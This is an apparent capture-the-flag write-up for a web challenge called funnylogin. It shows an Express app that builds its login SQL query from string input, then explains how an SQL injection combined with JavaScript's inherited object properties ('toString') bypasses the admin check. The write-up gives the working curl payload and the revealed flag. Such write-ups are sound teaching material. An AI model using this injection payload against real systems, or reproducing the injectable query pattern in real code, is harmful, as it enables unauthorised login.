We are given a Node.js project with a single app.js file:
```
const express = require('express');
const crypto = require('crypto');

const app = express();

const db = require('better-sqlite3')('db.sqlite3');
db.exec(`DROP TABLE IF EXISTS users;`);
db.exec(`CREATE TABLE users(
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT
);`);

const FLAG = process.env.FLAG || "dice{test_flag}";
const PORT = process.env.PORT || 3000;

const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));  
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);

const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];
isAdmin[newAdmin.user] = true;

app.use(express.urlencoded({ extended: false }));
app.use(express.static("public"));

app.post("/api/login", (req, res) => {
    const { user, pass } = req.body;

    const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`;
    try {
        const id = db.prepare(query).get()?.id;
        if (!id) {
            return res.redirect("/?message=Incorrect username or password");
        }

        if (users[id] && isAdmin[user]) {
            return res.redirect("/?flag=" + encodeURIComponent(FLAG));
        }
        return res.redirect("/?message=This system is currently only available to admins...");
    }
    catch {
        return res.redirect("/?message=Nice try...");
    }
});

app.listen(PORT, () => console.log(`web/funnylogin listening on port ${PORT}`));
```


<b>Source code analysis</b>

In this challenge, the server creates 100000 random users and passwords and stores them in a users array and in a SQLite database:
```
const users = [...Array(100_000)].map(() => ({ user: `user-${crypto.randomUUID()}`, pass: crypto.randomBytes(8).toString("hex") }));  
db.exec(`INSERT INTO users (id, username, password) VALUES ${users.map((u,i) => `(${i}, '${u.user}', '${u.pass}')`).join(", ")}`);
```
Next, it chooses one of the users at random and makes it administrator:
```
const isAdmin = {};
const newAdmin = users[Math.floor(Math.random() * users.length)];  
isAdmin[newAdmin.user] = true;
```
There is only one endpoint at /api/login (POST). We are asked to log in using username and password (user and pass in the request body).

There is a clear SQL injection vulnerability here:

    const query = `SELECT id FROM users WHERE username = '${user}' AND password = '${pass}';`; 

However, we need to pass this if statement in order to get the flag:

        if (users[id] && isAdmin[user]) {
            return res.redirect("/?flag=" + encodeURIComponent(FLAG));  
        }

<b>Exploitation</b>

Notice that the id variable comes from the SQL query, whereas the user comes from the request body. Using the SQLi, we are able to make SQLite return some id (notice that we don’t know any of the users and passwords).

However, we don’t know any of the names in the database, how are we going to know the exact name of the administrator? Well, JavaScript is very lax, and there are many values that will evaluate to true inside an if statement. For instance, functions:

```
> eval
[Function: eval]
> Boolean(eval)
true
```

So, we can do the following:

```
> const isAdmin = {}
undefined
> isAdmin['asdf'] = true
true
> isAdmin.
isAdmin.__proto__             isAdmin.constructor           isAdmin.hasOwnProperty        isAdmin.isPrototypeOf         isAdmin.propertyIsEnumerable  
isAdmin.toLocaleString        isAdmin.toString              isAdmin.valueOf

isAdmin.asdf
```
As can be seen, if we hit TAB we will see some recommended values to continue the expression isAdmin. As a result, we get some functions that can be execute by an object in JavaScript. Plus, we can access them as object attributes:
```
> isAdmin['toString']
[Function: toString]
> Boolean(isAdmin['toString'])  
true
```
To sum up, we need to use the SQLi to make the query return any value and then use any of the object default functions to make isAdmin[user] evaluate to true.
Flag

The following payload will do the trick:
```
$ curl https://funnylogin.mc.ax/api/login -d "user=toString&pass='+UNION+SELECT+1--+-"  
Found. Redirecting to /?flag=dice%7Bi_l0ve_java5cript!%7D
```
